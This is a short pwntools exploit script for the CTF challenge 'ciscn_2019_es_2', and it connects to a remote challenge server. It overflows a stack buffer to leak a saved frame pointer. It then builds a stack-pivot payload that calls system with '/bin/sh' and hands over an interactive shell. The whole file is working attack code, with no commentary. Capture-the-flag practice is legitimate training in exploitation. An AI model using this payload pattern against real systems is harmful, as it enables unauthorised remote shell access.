from pwn import *
context(arch='i386', os='linux')

# p = process("./ciscn_2019_es_2")
p = remote("node4.buuoj.cn", 26436)
elf = ELF("ciscn_2019_es_2")

pause()

payload = b'A' * 0x20 + b'B' * 7
p.sendline(payload)
p.recvuntil(b"BBBBBBB\n")
ebp_addr = u32(p.recv(4))

payload = b'A'*4 + p32(0x08048400) + p32(0xdeadbeef) + p32(ebp_addr-0x28) + b"/bin/sh\x00" 
payload += b"A" * 16 + p32(ebp_addr-0x38) + p32(0x08048562)
p.sendline(payload)

p.interactive()